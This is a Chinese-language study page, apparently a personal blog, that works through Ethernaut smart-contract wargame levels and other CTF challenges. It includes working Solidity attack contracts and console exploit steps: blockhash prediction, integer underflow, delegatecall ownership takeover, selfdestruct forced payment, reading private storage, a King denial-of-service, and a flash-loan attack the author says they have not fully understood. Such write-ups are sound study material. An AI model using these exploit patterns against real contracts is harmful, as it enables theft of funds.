<!doctype html>
<html>
  <head>
    <meta charset="utf-8">
    <title>solidity语言学习</title>
    </head>
  <body>
        <h1>solidity语言学习</h1> 
		<h2>ethernaut靶场刷题</h2>
	    <h3>1.Hello Ethernaut</h3>
		<p>按照要求在控制台输入指定内容即可</p>
		<p>合约交互包含player和contract，player代表用户钱包地址，contract包含合约实列abi，address以及方法等信息。</p>
		<p>第一步调用contract.info(),查看结果可知:</p>
		<p>第二步调用contract.info1(),查看结果可知:</p>
		<p>第三步调用contract.info2('hello'),查看结果可知:</p>
		<p>第四步调用contract.infoNum(),查看结果可知:</p>
		<p>第五步调用contract.info42(),查看结果可知:</p>
		<p>第六步调用contract.theMethodName(),查看结果可知:</p>
		<p>第七步调用contract.method7123949(),查看结果可知:</p>
		<p>第八步调用contract.password(),查看结果可知:</p>
		<p>第九步调用contract.authenticate(authenticate0),结束游戏</p>
		<img src="https://yexingyu123456.github.io/photograph/Ethernaut2.png">
		<br><br>
		<br><br>
		<br><br>
		<h3>2.Fallback</h3>
		<p>题目要求:获得合约所有权并把余额清零</p>
		<p>题目合约:</p>
		<img src="https://yexingyu123456.github.io/photograph/Ethernaut1.png">
		<p>观察可知:</p>
		<p>创建合约后 owner 有 1000ether ,调用 contribute() 需要转入超过 owner 的量即可改变 owner ,但是要求 msg.value 小于 0.001 ether </p>
		<p>receive() 要求合约调用者的 ether 大于0,所以需要先调用一次 contribute() 函数,然后向合约发送任意 ether 即可改变 owner </p>
		<p>成为 owner 后,调用 withdraw() 即可清空合约 ether </p>
		<p>第一步调用contract.contribute({value:1})向合约发送1wei</p>
		<p>第二步调用contract.sendTransaction({value:1})向合约发送1wei,或直接使用钱包向合约转账,成为owner</p>
		<p>第三步调用contract.withedraw()即可清空合约ether,游戏结束</p>
		<br><br>
		<br><br>
		<br><br>
		<h3>3.Fallout</h3>
		<p>题目要求:获取合约所有权</p>
		<p>题目合约:</p>
		<img src="https://yexingyu123456.github.io/photograph/ethernaut3.png">
		<p>观察合约内容:</p>
		<p>function Fallout 为与合约同名的构造函数,在部署合约时调用1次,但此处为function fal1out 可以直接调用</p>
		<p>第一步调用contract.Fal1out   结束游戏</p>
		<br><br>
		<br><br>
		<br><br>
		<h3>4.Coin Flip</h3>
		<p>题目要求:</p>
		<p>连续猜中十次</p>
		<p>题目合约:</p>
		<img src="https://yexingyu123456.github.io/photograph/Ethernaut4.png">
		<br><br>
		<a href="https://learnblockchain.cn/docs/solidity/units-and-global-variables.html">查看solidity文档</a>
		
		<p>blockhash(uint blockNumber) returns (bytes32)：指定区块的区块哈希 —— 仅可用于最新的 256 个</p>
		<p>根据合约,需要根据block.number(当前区块号)进行预测</p>
		<P>由    if (lastHash == blockValue) {</P>
			<p>revert();</p>
		  <p>}中的内容可知,同一个区块不可以调用两次Flip()</p>
		  <p>根据题目的计算方法,先将结果计算出来再调用flip()函数</p>
		<p>编写如下攻击合约</p>
	<textarea cols="140" rows="12">
			contract Attack {
				uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
				function attack(address _Flip) public returns (bool) {
					CoinFlip coinflip = CoinFlip(_Flip);
					uint256 blockValue = uint256(blockhash(block.number - 1));
					uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
					bool side = coinFlip == 1 ? true : false;
					coinflip.flip(side);
					return side;
				} 
			}
			
		</textarea>
		<p>放入题目合约中</p>
		<pre><code>
			// SPDX-License-Identifier: MIT
			pragma solidity ^0.8.0;
			
			contract CoinFlip {
			
			  uint256 public consecutiveWins;
			  uint256 lastHash;
			  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
			
			  constructor() {
				consecutiveWins = 0;
			  }
			
			  function flip(bool _guess) public returns (bool) {
				uint256 blockValue = uint256(blockhash(block.number - 1));
			
				if (lastHash == blockValue) {
				  revert();
				}
			
				lastHash = blockValue;
				uint256 coinFlip = blockValue / FACTOR;
				bool side = coinFlip == 1 ? true : false;
			
				if (side == _guess) {
				  consecutiveWins++;
				  return true;
				} else {
				  consecutiveWins = 0;
				  return false;
				}
			  }
			}
			contract Attack {
				uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
				function attack(address _Flip) public returns (bool) {
					CoinFlip coinflip = CoinFlip(_Flip);
					uint256 blockValue = uint256(blockhash(block.number - 1));
					uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
					bool side = coinFlip == 1 ? true : false;
					coinflip.flip(side);
					return side;
				} 
			}
					
		</code></pre>
		<p>在remix使用injected web3环境部署合约,然后填入被攻击合约的地址即可。调用10次attack(被攻击合约的地址),直到consecutiveWins为10,结束游戏</p>
		<br><br><br><br>
		<h3>5.Telephone</h3>
		<p>题目要求:</p>
		<p>获得合约所有权</p>
		<p>题目合约:</p>
		<img src="https://yexingyu123456.github.io/photograph/ethernaut5.png">
		<p>题目中msg.sender是合约调用者的地址[msg.sender ( address ): 消息发送者（当前调用）]</p>
		<p>[tx.origin ( address ): 交易发起者（完全的调用链）]</p>
		<p>由此创建一个合约进行调用即可满足(tx.origin != msg.sender)</p>
		<p>创建如下合约,已经知道原合约代码直接复制使用即可。否则可以使用interface进行调用</p>
		<img src="https://yexingyu123456.github.io/photograph/Ethernaut5.png">
		<p>部署合约时填入题目合约的地址,调用attack时填入自己钱包地址,完成后即可改变owner,游戏结束</p>
		<br><br><br><br>
		<h3>6.Token</h3>
		<p>题目要求:</p>
		<p>增加自己的Token</p>
		<p>题目合约:</p>
		<img src="https://yexingyu123456.github.io/photograph/Ethernaut6.png">
		<p>查看transfer后可知:</p>
		<p>对 require(balances[msg.sender] - _value >= 0)的要求,现在msg.sender所对应的Token有20个,如果让——value大于20就会发生向下溢出满足该要求</p>
		<p>如果转账给自己,又会发生向上溢出,相当于没有转账。所以:</p>
		<p>第一步调用contract.transfer函数,address填除了自己以外的任意地址,Value的值大于20即可</p>
		<p>第二步调用contract.balanceOf(player)查看自己的Token,如果变得很大则游戏结束</p>
		<br><br><br><br>
		<h3>7.Delegation</h3>
		<p>题目要求:</p>
		<p>获取到Delegation的owner</p>
		<p>题目合约:</p>
		<img src="https://yexingyu123456.github.io/photograph/Ethernaut7.png">
		<p>Delegation中有fallback函数,delegatecall可以使用合约delegate的pwn函数更换owner</p>
		<p>call: 最常用的调用方式，调用后内置变量 msg 的值会修改为调用者，执行环境为被调用者的运行环境(合约的 storage)。</p>
        <p>delegatecall: 调用后内置变量 msg 的值不会修改为调用者，但执行环境为调用者的运行环境。</p>
        <p>callcode: 调用后内置变量 msg 的值会修改为调用者，但执行环境为调用者的运行环境</p>
		<a href="https://learnblockchain.cn/docs/web3.js/web3-utils.html#sha3">web3-utils内容</a>
		<p>sendTransaction中的参数</p>
		<pre><code>
			from: DATA, 20字节 - 发送交易的源地址
			to: DATA, 20字节 - 交易的目标地址，当创建新合约时可选
			gas: QUANTITY - 交易执行可用gas量，可选整数，默认值90000，未用gas将返还。
			gasPrice: QUANTITY - gas价格，可选，默认值：待定(To-Be-Determined)
			value: QUANTITY - 交易发送的金额，可选整数
			data: DATA - 合约的编译带啊或被调用方法的签名及编码参数
			nonce: QUANTITY - nonce，可选。可以使用同一个nonce来实现挂起的交易的重写</code></pre>
			<p>第一步:调用contract.sendTransaction({data:web3.utils.keccak256("pwn()").slice(0,10)})</p>
			<p>其中slice表示取10   length</p>
			<p>调用完成后和获取到owner</p>
			<br><br><br><br><br>
			<h3>8.Force</h3>
			<p>题目如下</p>
            <pre><code>
                
有些合约就是拒绝你的付款,就是这么任性 ¯\_(ツ)_/¯

这一关的目标是使合约的余额大于0

  这可能有帮助:

Fallback 方法
有时候攻击一个合约最好的方法是使用另一个合约.
阅读上方的帮助页面, "Beyond the console" 部分
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
            </code></pre>
            <p>由于不知道force中合约内部函数的内容，如果有fallback函数，那么久可以向合约转账，尝试转账但是失败了</p>
            <p>可以利用合约自毁强制向合约中转账</p>
            <p>编写如下攻击合约</p>
            <img src="https://yexingyu123456.github.io/photograph/ethernaut8.png">
            <p>部署攻击合约，攻击合约的自毁函数selfdestruct(payable(addr))会将合约中的代币全部转入目标合约addr中</p>
            <p>完成游戏</p>
    <br><br><br><br>

            <h3>9.Vault</h3>
            <p>题目合约:</p>
            <pre><code>
                打开 vault 来通过这一关!

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
            </code></pre>
            <p>要解锁合约，需要得到password</p>
            <a href="https://learnblockchain.cn/docs/web3.js/web3-eth.html#getstorageat">查看solidity文档</a>
            <p>插槽solt:</p>
            <p>以太坊数据数据存储会为合约的每项数据指定一个可计算的存储位置，存放在一个数组中。数组中的每个每个元素称为插槽(slot),其初始值为0，每个插槽可以存储32个字节</p>
            <p>对于值类型，其存放是连续的，满足如下规律</p>
            <pre><code>
                        对于值类型的存储规则（除去映射，动态数组，bytes和string）：

               存储插槽storage slot 的第一项会以低位对齐（即右对齐）的方式储存。
               基本类型仅使用存储它们所需的字节。
               如果 存储插槽storage slot 中的剩余空间不足以储存一个基本类型，那么它会被移入下一个 存储插槽storage slot 。
               结构体（struct）和数组数据总是会占用一整个新插槽（但结构体或数组中的各项，都会以这些规则进行打包）。
               </code></pre>
               <a href="https://blog.csdn.net/rfrder/article/details/115706983">----------相关文章-----------</a>
               <p>对于本题目:</p>
               <p>locked占1byte，在solt 0 的位置，password占32byte，在solt 1 的位置</p>
               <p>第一步调用   await web3.eth.getStorageAt(contract.address,1)  获取byte32 password</p>
               <p>得到password后，第二步调用    contract.unlock(   )   括号中为得到的password</p>
               <p>可以调用  await contract.locked()来查看是否解锁成功，结束游戏</p>
            <br><br><br><br>
            <h3>10.king</h3>
            <p>题目如下</p>
            <pre><code>
                下面的合约表示了一个很简单的游戏: 任何一个发送了高于目前价格的人将成为新的国王. 在这个情况下, 上一个国王将会获得新的出价, 这样可以赚得一些以太币. 看起来像是庞氏骗局.

这么有趣的游戏, 你的目标是攻破他.

当你提交实例给关卡时, 关卡会重新申明王位. 你需要阻止他重获王位来通过这一关.

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}
            </code></pre>
            <p>观察合约可知：</p>
            <p>合约的receive函数中当一个人发送了比当前合约prize大的金额，就会取代当前的king。只要在成为king后不接受转账就可以一直是king</p>
            <p>编写如下攻击合约</p>
            <pre><code>
                // SPDX-License-Identifier: MIT
pragma solidity ^ 0.8.0;
contract attackking{
    constructor() public payable {}
    

    function attack(address payable addr) public payable{
        addr.call{value:0.002 ether,gas:1000000}("");
    }

        receive() external payable{
            revert();
        }
    }
    <p>创建合约时传入一些ether，填入目标地址调用即可</p>
            </code></pre>
			<br>
			<br>
			<br>
			<br>
			<br>
			<br>
			<br>
            <br>
            <br>
			<br>
			<br>
			<br>
			<br>
			<br>
			<br>
			<br>
			<br>
			<br>
			<br>
			<br>
			<br>
			<br>
			<br>
			<br>
			<br>
			<br>
			<br>
			<br>
			<br>
			<br>
			<br>
			<br>
			<h2>其他练习题目</h2>
			<h3>Copy_wallet.sol</h3>
			<p>题目如下:</p>
			<pre><code>
			//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import "@openzeppelin/contracts-upgradeable/utils/StorageSlotUpgradeable.sol";
interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);


    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


contract ERC20 is IERC20 {

    string public constant name = "ERC20";
    string public constant symbol = "ERC";
    uint8 public constant decimals = 18;
    mapping(address => uint256) balances;

    mapping(address => mapping (address => uint256)) allowed;

    uint256 totalSupply_ = 10 ether;
   constructor() {
    balances[msg.sender] = totalSupply_;
    }
    function totalSupply() public override view returns (uint256) {
    return totalSupply_;
    }
    function balanceOf(address tokenOwner) public override view returns (uint256) {
        return balances[tokenOwner];
    }
    function transfer(address receiver, uint256 numTokens) public override returns (bool) {
        require(numTokens <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender]-numTokens;
        balances[receiver] = balances[receiver]+numTokens;
        emit Transfer(msg.sender, receiver, numTokens);
        return true;
    }
    function approve(address delegate, uint256 numTokens) public override returns (bool) {
        allowed[msg.sender][delegate] = numTokens;
        emit Approval(msg.sender, delegate, numTokens);
        return true;
    }
    function allowance(address owner, address delegate) public override view returns (uint) {
        return allowed[owner][delegate];
    }
    function transferFrom(address owner, address buyer, uint256 numTokens) public override returns (bool) {
        require(numTokens <= balances[owner]);
        require(numTokens <= allowed[owner][msg.sender]);

        balances[owner] = balances[owner]-numTokens;
        allowed[owner][msg.sender] = allowed[owner][msg.sender]-numTokens;
        balances[buyer] = balances[buyer]+numTokens;
        emit Transfer(owner, buyer, numTokens);
        return true;
    }
}

contract wallet {
    struct Wallet{
        string walletName;
        uint256 uniqueTokens;
        mapping(address => uint256)balances;
    }
    struct Slot{
        bytes32 value;
    }
    mapping(address => Wallet[])public wallets;
    ERC20 public fake;
    event SendFlag(string email);
    constructor(){
        fake = new ERC20();
        
        wallets[address(this)].push();
        Wallet storage wallet = wallets[address(this)][0];
        wallet.walletName="cuit";
        wallet.uniqueTokens=1;
        wallet.balances[address(fake)]= 10 ether;
    }

    function addWallet(string memory name,address _token,uint256 amount)public{
        require(IERC20(_token).transferFrom(msg.sender,address(this),amount),"transferFrom failed");

        wallets[msg.sender].push();
        Wallet storage wallet = wallets[msg.sender][wallets[msg.sender].length-1];
        wallet.walletName=name;
        wallet.uniqueTokens=1;
        wallet.balances[_token] = amount;
    }

    function addWalletToken(uint256 index,address _token,uint256 amount)public{
        require(IERC20(_token).transferFrom(msg.sender,address(this),amount),"transferFrom failed");
        require(wallets[msg.sender].length-index>0);

        Wallet storage wallet = wallets[msg.sender][index];
        wallet.uniqueTokens++;
        wallet.balances[_token] = amount;
    }

    function getTokenBalance(address _addr,uint256 index,address _token)public view returns(uint256 amount){
        return wallets[_addr][index].balances[_token];
    }   

    function setSlot(bytes32 slot,bytes32 value)public {
        require(uint160(msg.sender)&0xff == 0x23);
        StorageSlotUpgradeable.getBytes32Slot(slot).value = value;
    }

    function isCompleted(string memory email)public{
        require(wallets[address(this)][0].balances[address(fake)]==0);
        emit SendFlag(email);
    }
    
}
			</code></pre>
			<p>题目要求:</p>
			<p>清空合约ether</p>
			<p>观察可知:</p>
			<p>setSlot函数可以改变对应槽中的数据,其require要求调用者地址的最后两位为23</p>
			<p>改变对应槽中的数据可以选择改变fake对应槽或者选择改变10个ether对应槽中的数据</p>
			<p>选择create2来计算合约地址最后两位为23,用这个地址来部署攻击合约调用setSlot()</p>
			<p>攻击合约如下:</p>
			<img src="https://yexingyu123456.github.io/photograph/exam1.png">
			<P>攻击合约中attack()中addr为wallet合约的地址,create2Factory合约中调用getaddress获取最后两位为23的地址,并获得slot</P>
			<p>deploy(slot),部署攻击合约</p>
			<p>部署完成后调出该合约,调用其中的slot函数,_slot为_value所对应的key,改变对应槽中的数据可以选择改变fake对应槽或者选择改变10个ether对应槽中的数据</p>
            <p>完成后可以查看wallet合约的getTokenBalance()查看是否清零,调用isCompleted()通过即可</p>
			<br><br><br><br><br><br><br>
			<h3>FlashLoanMain.sol</h3>
			<p>题目合约</p>
			<pre><code>
				pragma solidity ^0.8.0;

interface ICert {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IVault {
    function join(uint256 amount) external;
    function exit() external;
    function cert() external view returns(ICert);
    function transferToAccount(address account, uint256 amount) external returns(bool);
    function setPriveder(address flashLoanPriveder_) external;
}

interface IFlashBorrower {
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool);
}

interface IFlashLoanMain {
    function airdrop()external;
    function Complete()external returns(bool);
}

interface IFlashLoanPriveder {
    function flashLoan(
        IFlashBorrower receiver,
        address token,
        uint256 amount,
        bytes memory signature,
        bytes calldata data
    ) external returns (bool);
}

library StringsUpgradeable {
    bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";

    function toString(uint256 value) internal pure returns (string memory) {

        if (value == 0) {
            return "0";
        }
        uint256 temp = value;
        uint256 digits;
        while (temp != 0) {
            digits++;
            temp /= 10;
        }
        bytes memory buffer = new bytes(digits);
        while (value != 0) {
            digits -= 1;
            buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
            value /= 10;
        }
        return string(buffer);
    }

    function toHexString(uint256 value) internal pure returns (string memory) {
        if (value == 0) {
            return "0x00";
        }
        uint256 temp = value;
        uint256 length = 0;
        while (temp != 0) {
            length++;
            temp >>= 8;
        }
        return toHexString(value, length);
    }

    function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
        bytes memory buffer = new bytes(2 * length + 2);
        buffer[0] = "0";
        buffer[1] = "x";
        for (uint256 i = 2 * length + 1; i > 1; --i) {
            buffer[i] = _HEX_SYMBOLS[value & 0xf];
            value >>= 4;
        }
        require(value == 0, "Strings: hex length insufficient");
        return string(buffer);
    }
}

library ECDSAUpgradeable {
    enum RecoverError {
        NoError,
        InvalidSignature,
        InvalidSignatureLength,
        InvalidSignatureS,
        InvalidSignatureV
    }

    function _throwError(RecoverError error) private pure {
        if (error == RecoverError.NoError) {
            return; // no error: do nothing
        } else if (error == RecoverError.InvalidSignature) {
            revert("ECDSA: invalid signature");
        } else if (error == RecoverError.InvalidSignatureLength) {
            revert("ECDSA: invalid signature length");
        } else if (error == RecoverError.InvalidSignatureS) {
            revert("ECDSA: invalid signature 's' value");
        } else if (error == RecoverError.InvalidSignatureV) {
            revert("ECDSA: invalid signature 'v' value");
        }
    }
    function tryRecover(
        bytes32 hash,
        bytes32 r,
        bytes32 vs
    ) internal pure returns (address, RecoverError) {
        bytes32 s = vs & bytes32(0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);
        uint8 v = uint8((uint256(vs) >> 255) + 27);
        return tryRecover(hash, v, r, s);
    }

    function recover(
        bytes32 hash,
        bytes32 r,
        bytes32 vs
    ) internal pure returns (address) {
        (address recovered, RecoverError error) = tryRecover(hash, r, vs);
        _throwError(error);
        return recovered;
    }

    function tryRecover(bytes32 hash, bytes memory signature) internal pure returns (address, RecoverError) {
        if (signature.length == 65) {
            bytes32 r;
            bytes32 s;
            uint8 v;
            assembly {
                r := mload(add(signature, 0x20))
                s := mload(add(signature, 0x40))
                v := byte(0, mload(add(signature, 0x60)))
            }
            return tryRecover(hash, v, r, s);
        } else if (signature.length == 64) {
            bytes32 r;
            bytes32 vs;
            assembly {
                r := mload(add(signature, 0x20))
                vs := mload(add(signature, 0x40))
            }
            return tryRecover(hash, r, vs);
        } else {
            return (address(0), RecoverError.InvalidSignatureLength);
        }
    }

    function recover(bytes32 hash, bytes memory signature) internal pure returns (address) {
        (address recovered, RecoverError error) = tryRecover(hash, signature);
        _throwError(error);
        return recovered;
    }

    function tryRecover(
        bytes32 hash,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) internal pure returns (address, RecoverError) {
        if (uint256(s) > 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0) {
            return (address(0), RecoverError.InvalidSignatureS);
        }
        if (v != 27 && v != 28) {
            return (address(0), RecoverError.InvalidSignatureV);
        }

        address signer = ecrecover(hash, v, r, s);
        if (signer == address(0)) {
            return (address(0), RecoverError.InvalidSignature);
        }

        return (signer, RecoverError.NoError);
    }

    function recover(
        bytes32 hash,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) internal pure returns (address) {
        (address recovered, RecoverError error) = tryRecover(hash, v, r, s);
        _throwError(error);
        return recovered;
    }

    function toEthSignedMessageHash(bytes32 hash) internal pure returns (bytes32) {
        // 32 is the length in bytes of hash,
        // enforced by the type signature above
        return keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", hash));
    }

    function toEthSignedMessageHash(bytes memory s) internal pure returns (bytes32) {
        return keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n", StringsUpgradeable.toString(s.length), s));
    }

    function toTypedDataHash(bytes32 domainSeparator, bytes32 structHash) internal pure returns (bytes32) {
        return keccak256(abi.encodePacked("\x19\x01", domainSeparator, structHash));
    }
}

contract FlashLoanPriveder {
    IVault vault;
    bytes32 public msgHash = 0x1a6092262d7dc33c2f4b9913ad9318a8c41a138bb42dfacd4c7b6b46b8656522;
    bytes32 public r = 0xb158f1759111cd99128505f450f608c97178e2b6b9b6f7c3b0d2949e3a21cd02;
    bytes32 public s = 0x3ade8887fce9b513d41eb36180d6f7d9e072c756991034de2c9a5da541fb8184;
    uint8 public v = 0x1b;

    address public flashLoanMain;

    constructor (address vault_) {
        flashLoanMain = msg.sender;
        vault = IVault(vault_); 
    }

    function flashLoan(
        IFlashBorrower receiver,
        address token,
        uint256 amount,
        bytes memory signature,
        bytes calldata data
    ) external returns (bool){
        bytes32 message = keccak256(abi.encodePacked(address(this), amount, receiver, token));
        require(ECDSAUpgradeable.recover(msgHash,v,r,s) == ECDSAUpgradeable.recover(message, signature),"Error signer!");
        require(
            amount <= vault.cert().balanceOf(address(vault)),
            "AMOUNT_BIGGER_THAN_BALANCE"
        );
        require(vault.transferToAccount(address(receiver), amount), "FLASH_LENDER_TRANSFER_FAILED");
        require(
            receiver.onFlashLoan(msg.sender, token, amount, data) == true,
            "FLASH_LENDER_CALLBACK_FAILED"
        );
        require(
            ICert(vault.cert()).transferFrom(
                address(receiver),
                address(vault),
                amount
            ),
            "FLASH_LENDER_REPAY_FAILED"
        );
        return true;
    }

    function getMsgHash(IFlashBorrower receiver,address token,uint256 amount) public view returns(bytes32){
        bytes32 message = keccak256(abi.encodePacked(address(this), amount, receiver, token));
        return message;
    }

}


contract Cert {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    address public flashLoanMain;

    uint256 private _totalSupply;
    constructor()public {
        flashLoanMain = msg.sender;
    }


    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public returns (bool) {
        _spendAllowance(from, msg.sender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function mint(address to, uint256 amount) public {
        require(msg.sender==flashLoanMain,"Forbidden!");
        _mint(to, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[from] = fromBalance - amount;
        _balances[to] += amount;
    }

    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply += amount;
        _balances[account] += amount;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }
}


contract Vault {
    mapping(address => uint256) public balanceOf;
    ICert public cert;
    address flashLoanPriveder;
    uint256 public totalSupply;
    address public flashLoanMain;
    uint256 internal constant RATIO_MULTIPLY_FACTOR = 10**6;
    constructor (address cert_,uint amount) {
        flashLoanMain = msg.sender;
        cert = ICert(cert_);
        totalSupply += amount; 
        uint256 receivedETokens = amount *RATIO_MULTIPLY_FACTOR / getRatio();
        balanceOf[msg.sender] = receivedETokens;
    }

    function setPriveder(address flashLoanPriveder_)public {
        require(msg.sender==flashLoanMain,"setPriveder Forbidden!");
        flashLoanPriveder = flashLoanPriveder_;
    }

    function join(uint256 amount) external{
        require(amount > 0, "CANNOT_STAKE_ZERO_TOKENS");
        uint256 receivedETokens = amount *RATIO_MULTIPLY_FACTOR / getRatio();
        totalSupply += receivedETokens;
        balanceOf[msg.sender] += receivedETokens;
        require(cert.transferFrom(msg.sender, address(this), amount),"TRANSFER_STAKED_FAIL");
    }

    function exit() external {
        uint256 amount = balanceOf[msg.sender];
        uint256 stakedTokensToTransfer = amount * getRatio() / RATIO_MULTIPLY_FACTOR;
        totalSupply -= amount;
        balanceOf[msg.sender] = 0;
        require(cert.transfer(msg.sender, stakedTokensToTransfer), 'TRANSFER_STAKED_FAIL');
    }

    function getRatio() public view returns(uint256){
        if (totalSupply> 0 && cert.balanceOf(address(this)) > 0) {
            return cert.balanceOf(address(this)) *RATIO_MULTIPLY_FACTOR / totalSupply;
        }
        return 1;
    }

    function transferToAccount(address account, uint256 amount) external returns(bool){
        require(msg.sender==flashLoanPriveder,"transferToAccount Forbidden!");
        return cert.transfer(account, amount);
    }
}

contract FlashLoanMain {
    Vault public vault;
    Cert public cert;
    FlashLoanPriveder public flashLoanPriveder;
    bool public isAirdrop;
    bool public isComplete;
    event sendflag(address user);
    constructor() {
        cert = new Cert();
        vault = new Vault(address(cert),1000*10**18);
        cert.mint(address(vault),1000*10**18);
        flashLoanPriveder = new FlashLoanPriveder(address(vault));
        vault.setPriveder(address(flashLoanPriveder));
    }

    function airdrop() public {
        require(!isAirdrop,"Already get airdrop!");
        cert.mint(msg.sender,100*10**18);
        isAirdrop = true;
    }

    function Complete()public returns(bool) {
        if (cert.balanceOf(msg.sender)>100*10**18){
            isComplete = true;
            emit sendflag(msg.sender);
        }
        return isComplete;
    }
}




</code></pre>
<p>攻击合约</p>
<pre><code>
	// SPDX-License-Identifier: MIT
import "4.sol";
contract attack{
    FlashLoanPriveder  privider;
    FlashLoanMain main;
    Vault vault;
    Cert cert;

constructor(address _add1,address _add2,address _add3,address _add4) public payable{
    privider = FlashLoanPriveder(_add1);
    main = FlashLoanMain(_add2);
    vault = Vault(_add3);
    cert = Cert(_add4);
}

function doflashon(IFlashBorrower receiver,address token,uint256 amount,bytes memory signature,bytes calldata data) public{
    main.airdrop();
    privider.flashLoan(receiver,token,amount,signature,data);
    
}
function onFlashLoan(address initator,address token,uint256 amount,bytes calldata) external returns(bool){
    cert.approve(address(vault),1000);
    vault.join(1000);
    main.Complete();
    cert.approve(address(privider),amount);
    return true;
}
function withdraw() public{
    vault.exit();
    
}
function Complete() public {
    main.Complete();
}
}
</code></pre>
<p>还没完全搞懂这道题</p>
<br><br><br><br><br><br><br><br><br>
<h3>LostAssets.sol</h3>
<p>题目合约</p>
<pre><code>
	pragma solidity 0.8.10;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {IERC20Permit, ERC20Permit} from "@openzeppelin/contracts/token/ERC20/extensions/draft-ERC20Permit.sol";

contract MockWETH is ERC20("Wrapped ETH", "WETH") {
    event Deposit(address indexed dst, uint256 wad);
    event Withdrawal(address indexed src, uint256 wad);

    /// @dev Original WETH9 implements `fallback` function instead of `receive` function due to a earlier solidity version
    fallback() external payable {
        deposit();
    }

    function deposit() public payable {
        _mint(msg.sender, msg.value);
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw(uint256 wad) public {
        require(balanceOf(msg.sender) >= wad, "weth: insufficient balance");

        _burn(msg.sender, wad);
        (bool success, ) = msg.sender.call{value: wad}("");
        require(success, "weth: failed");

        emit Withdrawal(msg.sender, wad);
    }
}

/// @notice Token sWETH
contract MocksWETH is ERC20Permit {
    using SafeERC20 for IERC20;

    address underlying;

    constructor(address _underlying)
        ERC20("WrappedERC20", "WERC20")
        ERC20Permit("WrappedERC20")
    {
        underlying = _underlying;
    }

    function deposit() external returns (uint256) {
        uint256 _amount = IERC20(underlying).balanceOf(msg.sender);
        IERC20(underlying).safeTransferFrom(msg.sender, address(this), _amount);
        return _deposit(_amount, msg.sender);
    }

    function deposit(uint256 amount) external returns (uint256) {
        IERC20(underlying).safeTransferFrom(msg.sender, address(this), amount);
        return _deposit(amount, msg.sender);
    }

    function depositWithPermit(
        address target,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s,
        address to
    ) external returns (uint256) {
        // permit is an alternative to the standard approve call:
        // it allows an off-chain secure signature to be used to register an allowance.
        // The permitter is approving the beneficiary to spend their money, by signing the permit request
        IERC20Permit(underlying).permit(
            target,
            address(this),
            value,
            deadline,
            v,
